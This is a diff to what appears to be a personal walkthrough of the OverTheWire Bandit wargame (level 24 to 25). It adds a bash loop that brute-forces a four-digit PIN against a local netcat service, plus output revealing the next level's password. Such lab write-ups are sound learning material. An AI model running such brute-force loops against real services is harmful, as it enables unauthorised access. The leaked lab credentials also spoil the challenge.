@@ -270,5 +270,30 @@ $ cd /tmp/ao3424
 ```
 script content;
 ```
-
+#!/bin/bash
+for PIN in {2023..9999}
+do
+	while [ -z "$TEST" ]
+	do
+		TEST=$(echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $PIN" | nc 127.0.0.1 30002)
+		if [ -z "$TEST" ]
+		then
+			sleep 2
+		fi
+	done
+	if [[ $TEST != *"Wrong"* ]];
+	then
+		echo $TEST
+		echo "gotcha  $PIN" | tee /tmp/ao3424/pass25
+		break
+	fi
+	echo "$TEST $PIN"
+	TEST=""
+done
 ```
+Result after *5540* try
+```
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Correct! The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Exiting.
+```
+bandit25>26
+
